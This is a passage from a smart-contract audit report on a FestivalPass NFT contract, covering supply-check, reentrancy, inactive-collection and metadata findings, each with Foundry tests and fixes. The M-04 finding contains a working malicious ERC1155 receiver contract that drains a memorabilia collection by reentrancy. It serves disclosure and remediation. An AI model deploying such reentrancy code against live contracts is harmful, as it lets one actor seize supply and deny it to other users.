        // Mint the unique NFT
        _mint(msg.sender, tokenId, 1, "");
        
        emit MemorabiliaRedeemed(msg.sender, tokenId, collectionId, itemId);
    }

```

## Risk

**Likelihood**:

* A legitimate user calls `redeemMemorabilia` attempting to redeem the last NFT in a collection.

**Impact**:

* The user fails to get the NFT, even though the redemption counter has not reached the maximum supply of the collection.

## Proof of Concept

The following test shows a user trying to redeem the 10th NFT in one collection. Running `forge test --mt test_Audit_RedeemMaxSupply -vv` shows the output that the 10th redemption is reverted due to the sold out.

```Solidity
    function test_Audit_RedeemMaxSupply() public {
        vm.prank(organizer);
        uint256 maxSupply = 10; // Cap for memorabilia NFT collection
        uint256 collectionId = festivalPass.createMemorabiliaCollection(
            "Future Release",
            "ipfs://QmFuture",
            10e18,
            maxSupply,
            true
        );
        vm.startPrank(address(festivalPass));
        beatToken.mint(user1, 10000e18); // Give enough BEAT for user
        vm.stopPrank();

        vm.startPrank(user1);
        for (uint256 i = 0; i < maxSupply - 1; i++) {
            festivalPass.redeemMemorabilia(collectionId);
            console.log("Redeem sucess:", i + 1); // Redeem success from 1 to 9
        }

        // 10th redeem call reverts with "Collection Sold out"
        vm.expectRevert("Collection sold out");
        festivalPass.redeemMemorabilia(collectionId);
        console.log("Redeem reverted:", maxSupply);
        vm.stopPrank();
    }
```

## Recommended Mitigation

Modify the supply check in `redeemMemorabilia` to use `<=` (less than or equal to) instead of `<`, ensuring that the final item can be redeemed. This approach is preferable to modifying the `createMemorabiliaCollection` function (which is clearly documented to start `currentItemId` at 1).

```diff
    // Redeem a memorabilia NFT from a collection
    function redeemMemorabilia(uint256 collectionId) external {
        MemorabiliaCollection storage collection = collections[collectionId];
        require(collection.priceInBeat > 0, "Collection does not exist");
        require(collection.isActive, "Collection not active");
-       require(collection.currentItemId < collection.maxSupply, "Collection sold out");
+       require(collection.currentItemId <= collection.maxSupply, "Collection sold out"); // allow equals
        // Burn BEAT tokens
        BeatToken(beatToken).burnFrom(msg.sender, collection.priceInBeat);
        
        // Generate unique token ID
        uint256 itemId = collection.currentItemId++;
        uint256 tokenId = encodeTokenId(collectionId, itemId);
        
        // Store edition number
        tokenIdToEdition[tokenId] = itemId;
        
        // Mint the unique NFT
        _mint(msg.sender, tokenId, 1, "");
        
        emit MemorabiliaRedeemed(msg.sender, tokenId, collectionId, itemId);
    }

```

## <a id='M-04'></a>M-04. A malicious contract can monopolize all memorabilia in a single transaction via ERC1155 reentrancy

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


# Root + Impact

## Description

* When a user calls `redeemMemorabilia`, the contract:

  &#x20;

  * Checks the collection is active and not sold out.

  * Burns the caller’s `BEAT` tokens as payment.

  * Mints a unique memorabilia NFT to the user.

  * Emits a `MemorabiliaRedeemed` event.

* Due to the `ERC1155` standard, minting to a **smart contract** address triggers the recipient’s `onERC1155Received` hook.\
  If the recipient is **malicious**, this hook can immediately **re-enter** `redeemMemorabilia` **before the first call finishes**, repeatedly minting new NFTs within a single transaction until the collection is exhausted

✅ **Why this works:**

&#x20;

* The `burnFrom` is executed before mint, so the attacker must spend the correct `priceInBeat` for every loop iteration.

* However, an attacker with enough BEAT can drain the entire memorabilia supply atomically.

* Legitimate users are locked out because the entire supply is consumed before they can transact

```Solidity
function redeemMemorabilia(uint256 collectionId) external {
    MemorabiliaCollection storage collection = collections[collectionId];
    require(collection.priceInBeat > 0, "Collection does not exist");
    require(collection.isActive, "Collection not active");
    require(collection.currentItemId < collection.maxSupply, "Collection sold out");

    BeatToken(beatToken).burnFrom(msg.sender, collection.priceInBeat); // ✅ burn happens first, which adds extra security

    uint256 itemId = collection.currentItemId++;
    uint256 tokenId = encodeTokenId(collectionId, itemId);

    tokenIdToEdition[tokenId] = itemId;

    _mint(msg.sender, tokenId, 1, "");  // @> untrusted external call: triggers onERC1155Received

    emit MemorabiliaRedeemed(msg.sender, tokenId, collectionId, itemId);
}

```

## Risk

**Likelihood**:

* Any user with enough BEAT can deploy a malicious receiver contract.

* &#x20;

  The attacker does not need privileged access.

* The hoarding can happen atomically within one block.

**Impact**:

* The entire memorabilia collection can be fully redeemed by a single actor.

* &#x20;This violates the fairness of distribution.

* It results in a denial-of-service for legitimate festival attendees who cannot get memorabilia.

## Proof of Concept

1. An attacker deploys a malicious contract that re-enters when onERC1155Received is called
2. the contract has accumulated or has received BEAT tokens over time
3. The attacker performs the attack

Paste this function in your `FestivalPass.sol` contract, to know what's really going on behind the scene

```Solidity
// Use this getter function in your FestivalPass.sol contract
function getCollections(uint256 collectionId) external view returns (string memory name, string memory baseUri, uint256 priceInBeat, uint256 maxSupply, uint256 currentItemId, bool isActive) {
        MemorabiliaCollection storage collection = collections[collectionId];
        return (
            collection.name,
            collection.baseUri,
            collection.priceInBeat,
            collection.maxSupply,
            collection.currentItemId,
            collection.isActive
        );
    }
```

Paste in your `FestivalPassTest.t.sol` file or create a separate contract and inherit it in the test

```Solidity
// An attacker deploys a malicious contract that handles onERC1155Received
contract MaliciousReceiver is IERC1155Receiver {
    FestivalPass public festival;
    uint256 public collectionId;

    constructor(address _festival, uint256 _collectionId) {
        festival = FestivalPass(_festival);
        collectionId = _collectionId;
    }

    function startAttack(uint256 times) external {
        // Kick off first call
        festival.redeemMemorabilia(collectionId);
    }

    function onERC1155Received(
        address, address, uint256, uint256, bytes calldata
    ) external override returns (bytes4) {
        // Re-enter during mint callback
        (
            ,
            ,
            ,
            uint256 maxSupply,
            uint256 currentItemId,

        ) = festival.getCollections(collectionId);

        if (currentItemId < maxSupply) {
            festival.redeemMemorabilia(collectionId);
        }
        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external override returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }

    function supportsInterface(bytes4 interfaceId) external pure override returns (bool) {
        return true;
    }
}
```

Paste this in your `FestivalPassTest.t.sol` contract

```solidity

function test_MaliciousRecieverRedeemsAllMemorabilia() public {
        // Organizer creates a memorabilia collection
        vm.startPrank(organizer);
        uint256 collectionId = festivalPass.createMemorabiliaCollection(
            "Golden Hats",
            "ipfs://QmGoldenHats",
            500e18,
            10,
            true
        );
        vm.stopPrank();

        // Attacker deploys a malicious receiver contract
        // This contract will try to redeem all items in the collection
        vm.startPrank(attacker);
        MaliciousReceiver maliciousReceiver = new MaliciousReceiver(address(festivalPass), collectionId);
        vm.stopPrank();

        // assuming the malicious receiver has accumulated enough BEAT tokens over time
        vm.startPrank(address(festivalPass));
        beatToken.mint(address(maliciousReceiver), 100000e18); 
        vm.stopPrank();

        // The attacker starts the attack by calling redeemMemorabilia
        vm.startPrank(attacker);
        maliciousReceiver.startAttack(10); // Start attack to redeem all items
        vm.stopPrank();

        // The malicious receiver will keep calling redeemMemorabilia until all items are redeemed
        // This simulates a re-entrancy attack where the receiver keeps calling the redeem function
        // until the collection is exhausted.

        (
            ,
            ,
            ,
            ,
            uint256 currentItemId,

        ) = festivalPass.getCollections(collectionId);

        assertEq(currentItemId, 10); // Should have redeemed all 10 items
    }
```

## Recommended Mitigation

```diff
+ import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

+ contract FestivalPass is ERC1155, Ownable2Step, IFestivalPass, ReentrancyGuard { ... }

+ mapping(address=>bool) public hasClaimed;

- function redeemMemorabilia(uint256 collectionId) external {
+ function redeemMemorabilia(uint256 collectionId) external nonReentrant {
        MemorabiliaCollection storage collection = collections[collectionId];
        require(collection.priceInBeat > 0, "Collection does not exist");
        require(collection.isActive, "Collection not active");
        require(collection.currentItemId < collection.maxSupply, "Collection sold out");
+        require(!hasClaimed[msg.sender], "This address claimed already")
        
        // Burn BEAT tokens
        BeatToken(beatToken).burnFrom(msg.sender, collection.priceInBeat);
        
        // Generate unique token ID
        uint256 itemId = collection.currentItemId++;
        uint256 tokenId = encodeTokenId(collectionId, itemId);
        
        // Store edition number
        tokenIdToEdition[tokenId] = itemId;
+       hasClaimed[msg.sender]= true;
        
        // Mint the unique NFT
        _mint(msg.sender, tokenId, 1, "");
        
        emit MemorabiliaRedeemed(msg.sender, tokenId, collectionId, itemId);
}
```


# Low Risk Findings

## <a id='L-01'></a>L-01. Inactive Collections — Indefinite BEAT Lock-up

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


# Inactive Collections — Indefinite BEAT Lock-up

## Description

* Normal behaviour: Organizer creates memorabilia collections with `activateNow = true` so users can immediately redeem BEAT for NFTs.

* Issue: Collections can be created with `activateNow = false` and there is **no mechanism** to activate them later, nor any timeout. Users may acquire BEAT expecting to redeem specific memorabilia, but the organizer can indefinitely prevent access.

```solidity
function createMemorabiliaCollection(..., bool activateNow) external onlyOrganizer {
    // ... validation ...
@>  collections[collectionId] = MemorabiliaCollection({
        // ...
        isActive: activateNow  // Can be false forever
    });
}

function redeemMemorabilia(uint256 collectionId) external {
@>  require(collection.isActive, "Collection not active");  // Permanent block
    // ...
}
```

## Risk

**Likelihood**:

* Organizer may create collections in advance but forget to activate.

* Intentional strategy to create hype then indefinitely delay launch.

**Impact**:

* Users hold BEAT tokens anticipating memorabilia that never becomes available.

* Economic utility of BEAT reduced if major collections remain locked.

## Proof of Concept

```solidity
function test_CollectionNeverActivated() public {
    // Alice gets BEAT tokens
    vm.prank(alice);
    festivalPass.buyPass{value: 0.1 ether}(VIP_PASS); // gets 5 BEAT bonus
    
    // Organizer creates inactive collection
    vm.prank(organizer);
    uint256 collectionId = festivalPass.createMemorabiliaCollection(
        "Limited Edition", "ipfs://limited", 3e18, 100, false  // NOT activated
    );
    
    // Alice tries to redeem but can't
    vm.prank(alice);
    vm.expectRevert("Collection not active");
    festivalPass.redeemMemorabilia(collectionId);
    
    // Time passes, organizer chooses not to activate
    vm.warp(block.timestamp + 365 days);
    
    // Alice still can't redeem - funds effectively locked
    vm.prank(alice);
    vm.expectRevert("Collection not active");
    festivalPass.redeemMemorabilia(collectionId);
    
    assertEq(beatToken.balanceOf(alice), 5e18, "Alice holds 'useless' BEAT");
}
```

## Recommended Mitigation

```diff
+ mapping(uint256 => bool) public collectionActivated;

+ function activateCollection(uint256 collectionId) external onlyOrganizer {
+     require(collections[collectionId].priceInBeat > 0, "Collection does not exist");
+     collections[collectionId].isActive = true;
+     collectionActivated[collectionId] = true;
+ }

// Or add automatic timeout:
+ uint256 constant ACTIVATION_DEADLINE = 30 days;
+ mapping(uint256 => uint256) public collectionCreatedAt;

function createMemorabiliaCollection(...) external onlyOrganizer {
    // ...
+   collectionCreatedAt[collectionId] = block.timestamp;
}

function redeemMemorabilia(uint256 collectionId) external {
    MemorabiliaCollection storage collection = collections[collectionId];
+   bool autoActive = block.timestamp >= collectionCreatedAt[collectionId] + ACTIVATION_DEADLINE;
+   require(collection.isActive || autoActive, "Collection not active");
    // ...
}
```

## <a id='L-02'></a>L-02. FestivalPass.sol - URI Function Returns Metadata for Non-Existent Items

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


### Description

The `uri` function returns metadata URLs for any token ID that belongs to an existing collection, even if the specific item within that collection was never minted. This creates confusion about which tokens actually exist and can cause integration issues with external systems that rely on URI responses to determine token validity.

### Root Cause

The URI function only validates that the collection exists but doesn't verify that the specific item was actually minted:

```solidity
function uri(uint256 tokenId) public view override returns (string memory) {
    // Handle regular passes (IDs 1-3)
    if (tokenId <= BACKSTAGE_PASS) {
        return string(abi.encodePacked("ipfs://beatdrop/", Strings.toString(tokenId)));
    }
    
    // Decode collection and item IDs
    (uint256 collectionId, uint256 itemId) = decodeTokenId(tokenId);
    
    // Check if it's a valid memorabilia token
    if (collections[collectionId].priceInBeat > 0) {
        // ❌ Returns URI even for non-existent items!
        return string(abi.encodePacked(
            collections[collectionId].baseUri,
            "/metadata/",
            Strings.toString(itemId)
        ));
    }
    
    return super.uri(tokenId);
}
```

The function should also verify that `itemId` is within the range of actually minted items (`itemId > 0 && itemId < collections[collectionId].currentItemId`).

### Risk

**Likelihood**: Medium - Any external system querying URIs for memorabilia tokens can encounter this issue when checking non-existent item IDs.

**Impact**: Low - No funds are at risk, but metadata integrity is compromised and external integrations may be confused.

### Impact

* External systems receive metadata URLs for tokens that were never minted

* NFT marketplaces might display non-existent items as available

* Inconsistent behavior between `balanceOf()` (returns 0 for non-existent tokens) and `uri()` (returns metadata)

* Confusion about which items in a collection actually exist

* Potential integration failures with systems expecting URI calls to fail for non-existent tokens

### Proof of Concept

This test demonstrates how the URI function returns metadata for items that were never minted:

```solidity
function test_URIReturnsInvalidMetadataForNonExistentItems() public {
    // Organizer creates a collection with maxSupply = 5
    vm.prank(organizer);
    uint256 collectionId = festivalPass.createMemorabiliaCollection(
        "Test Collection",
        "ipfs://testbase",
        50e18,
        5,  // maxSupply = 5
        true
    );
    
    // Give user BEAT tokens and let them redeem 2 items
    vm.prank(address(festivalPass));
    beatToken.mint(user1, 200e18);
    
    // User redeems 2 items (itemIds 1 and 2)
    vm.startPrank(user1);
    festivalPass.redeemMemorabilia(collectionId);  // Item 1
    festivalPass.redeemMemorabilia(collectionId);  // Item 2
    vm.stopPrank();
    
    // Collection now has currentItemId = 3 (next item to be minted)
    // Only items 1 and 2 actually exist
    
    // Encode token IDs for existing and non-existing items
    uint256 existingItem1 = festivalPass.encodeTokenId(collectionId, 1);
    uint256 existingItem2 = festivalPass.encodeTokenId(collectionId, 2);
    uint256 nonExistentItem3 = festivalPass.encodeTokenId(collectionId, 3);
    uint256 nonExistentItem6 = festivalPass.encodeTokenId(collectionId, 6);
    
    // Verify only items 1 and 2 actually exist (user owns them)
    assertEq(festivalPass.balanceOf(user1, existingItem1), 1);
    assertEq(festivalPass.balanceOf(user1, existingItem2), 1);
    assertEq(festivalPass.balanceOf(user1, nonExistentItem3), 0);
    assertEq(festivalPass.balanceOf(user1, nonExistentItem6), 0);
    
    // BUT uri() function returns metadata URLs for ALL items, even non-existent ones!
    string memory uri1 = festivalPass.uri(existingItem1);
    string memory uri2 = festivalPass.uri(existingItem2);
    string memory uri3 = festivalPass.uri(nonExistentItem3);  // Should not exist!
    string memory uri6 = festivalPass.uri(nonExistentItem6);  // Should not exist!
    
    // All URIs are returned even for non-existent items
    assertEq(uri1, "ipfs://testbase/metadata/1");
    assertEq(uri2, "ipfs://testbase/metadata/2");
    assertEq(uri3, "ipfs://testbase/metadata/3"); // ❌ This shouldn't exist
    assertEq(uri6, "ipfs://testbase/metadata/6"); // ❌ This shouldn't exist
    
    // This creates confusion - external systems get metadata URLs for tokens that were never minted
    console.log("URI for non-existent item 3:", uri3);
    console.log("URI for non-existent item 6:", uri6);
}
```

### Recommended Mitigation

Add validation to ensure the requested item actually exists within the collection:

```diff
function uri(uint256 tokenId) public view override returns (string memory) {
    // Handle regular passes (IDs 1-3)
    if (tokenId <= BACKSTAGE_PASS) {
        return string(abi.encodePacked("ipfs://beatdrop/", Strings.toString(tokenId)));
    }
    
    // Decode collection and item IDs
    (uint256 collectionId, uint256 itemId) = decodeTokenId(tokenId);
    
    // Check if it's a valid memorabilia token
    if (collections[collectionId].priceInBeat > 0) {
+       // Validate that the item actually exists
+       require(itemId > 0 && itemId < collections[collectionId].currentItemId, "Item does not exist");
        
        return string(abi.encodePacked(
            collections[collectionId].baseUri,
            "/metadata/",
            Strings.toString(itemId)
        ));
    }
    
    return super.uri(tokenId);
}
```

This ensures that URI calls will fail for non-existent items, providing consistent behavior with the rest of the contract and preventing confusion for external integrators.





    